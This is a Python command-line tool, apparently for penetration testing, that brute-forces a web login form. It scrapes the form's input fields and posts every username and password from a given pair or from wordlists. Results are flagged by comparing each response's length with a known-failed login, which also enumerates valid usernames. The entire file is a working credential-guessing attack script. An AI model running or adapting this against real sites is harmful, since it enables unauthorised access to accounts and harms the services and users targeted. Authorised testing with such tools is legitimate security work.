#!/bin/python3

import os,requests

def validate_num(u_input,upper_limit):
    while u_input.isdigit() == False or int(u_input) < 1 or int(u_input) > upper_limit:
        u_input = input("Please enter a number between 1 and " + str(upper_limit) + ": ")
    return u_input

def validate_yn(u_input):
    while u_input.lower() != "y" and u_input.lower() != "n":
        u_input = input("Please enter either 'Y' or 'N': ")
    return u_input

def brute_force(data,f_user,f_pass,username,password,url,l_fail,l_user):
        RED = '\033[31m'
        GREEN = '\033[32m'
        YELLOW = '\033[33m'
        RESET = '\033[m'
        data[f_user] = username
        data[f_pass] = password
        attempt = requests.post(url,data=data)
        l_attempt = len(attempt.content)
        if l_attempt == l_fail:
                VAR_COL = RED
        elif l_attempt == l_user:
                VAR_COL = YELLOW
        else:
                VAR_COL = GREEN
        print(VAR_COL + str(username) + ":" + str(password) + RESET)

def main():
        post_data = {}
        field_menu = {}
        user_options = str()
        website = ""
        valid_file = 0
        while len(website) == 0:
                url = input("Enter the address for the web form to brute force.\nExample: http://192.168.0.1/login.php\n")
                try:
                        website = requests.get(url, timeout = 10).content
                except:
                        print ("Unable to connect to the website. Please try again.\n")
        website_inputs = str(website).split("<input ")
        if "?" in url:
                try:
                        url_sections = url.split("?")
                        url_sections_len = len(url_sections)
                        url2 = str()
                        index = 0
                        for part in url_sections:
                                if index != 0 and index != url_sections_len-1:
                                        url2 += "?"
                                if index != url_sections_len-1:
                                        url2 += part
                                index += 1
                        if url != url2:
                                url_choice = validate_num(input("\nWhich web address will be used in the brute force attempts?" +\
"\n1 - " + url + " (Original)\n2 - " + url2+ "\n"), 2)
                                if url_choice == "2":
                                        url = url_sections[len(url_sections)-2]
                except:
                        pass
        index = 1
        for line in website_inputs:
                sub_index = 0
                key = str()
                description = str()
                line = line.split("/>")[0]
                data = line.split('"')
                for field in data:
                        if "name=" in field:
                                key = data[sub_index+1]
                        if "value=" in field:
                                description = data[sub_index+1]
                        sub_index += 1
                if key in post_data and (len(post_data[key]) > 0 or len(description) > 0) and post_data[key] != description:
                        overwrite = validate_num(input("\nDuplicate field detected - " + str(key) +\
".\n1 - " + str(post_data[key]) + "\n2 - " + description + "\nWhich value should be used?: "), 2)
                        if overwrite == "2":
                                post_data[key] = description
                elif len(key) > 0 and key not in post_data:
                        post_data[key] = description
                        field_menu[str(index)] = key
                        user_options += str(index) + " - " + key + " = " + description + "\n"
                        index += 1
        if len(post_data) > 0:
                print ("\nWeb form fields detected:\n" + user_options)
        else:
                input("No web form fields detected. Press enter to exit.")
                exit()
        user_ref = field_menu[validate_num(input("Which field is used for the username?: "), len(post_data))]
        pass_ref = field_menu[validate_num(input("Which field is used for the password?: "), len(post_data))]
        user_method = validate_num(input("\nHow many usernames do you want to check?\n1 - One\n2 - Multiple\n"), 2)
        if user_method == "1":
                username = input("\nEnter a username: ")
        else:
                while valid_file == 0:
                        username = input("\nEnter the file location of the list of usernames to use: ")
                        if os.path.isfile(username) == False:
                                yn = validate_yn(input("\nUnfortunately this file either doesn't exist or there was an issue opening it. Would you like to try again?\n'Y' for Yes and 'N' for No. Note: saying No will close the program.\n"))
                                if yn.lower() == "n":
                                        exit()
                        else:
                                valid_file = 1
        pass_method = validate_num(input("\nHow many passwords do you want to check?\n1 - One\n2 - Multiple\n"), 2)
        if pass_method == "1":
                password = input("\nEnter a password: ")
        else:
                valid_file = 0
                while valid_file == 0:
                        password = input("\nEnter the file location of the list of passwords to use: ")
                        if os.path.isfile(password) == False:
                                yn = validate_yn(input("\nUnfortunately this file either doesn't exist or there was an issue opening it. Would you like to try again?\n'Y' for Yes and 'N' for No. Note: saying No will close the program.\n"))
                                if yn.lower() == "n":
                                        exit()
                        else:
                                valid_file = 1
        found_users = []
        incorrect_data = post_data
        incorrect_data[user_ref] = "NEVERbeaUSERname10293856"
        incorrect_data[pass_ref] = "zgsdjufhneverBEaPASSWORD"
        fail = requests.post(url,data=incorrect_data)

        print ("\nFuzzing username(s) provided...\n")
        len_fail = len(fail.content)
        len_user = len_fail
        if user_method == "1":
                user_list = [username]
        else:
                with open(username) as load_list:
                        user_list = load_list.read().splitlines()
        if pass_method == "1":
                pass_list = [password]
        else:
                with open(password, errors='ignore') as load_list:
                        pass_list = load_list.read().splitlines()
        for u in user_list:
                incorrect_data[user_ref] = str(u)
                len_user = len(requests.post(url,data=incorrect_data).content)
                if len_user != len_fail:
                        break
        for p in pass_list:
                for u in user_list:
                        brute_force(post_data,user_ref,pass_ref,u,p,url,len_fail,len_user)

main()
